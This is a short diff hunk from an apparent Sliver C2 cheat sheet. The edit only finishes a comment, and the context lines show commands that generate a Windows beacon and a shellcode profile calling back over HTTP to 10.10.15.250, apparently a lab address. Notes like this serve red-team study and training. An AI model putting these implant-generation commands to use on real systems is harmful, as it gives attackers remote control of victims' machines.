@@ -167,7 +167,7 @@ sliver > generate beacon --arch amd64 --os windows --http 10.10.15.250:80 -f she
 
 
 ```bash
-# Using a 
+# Using a profile
 sliver > profiles new --http  http://10.10.15.250  --format shellcode --arch amd64 basic_shellcode
 ```
 ## Cheatsheet
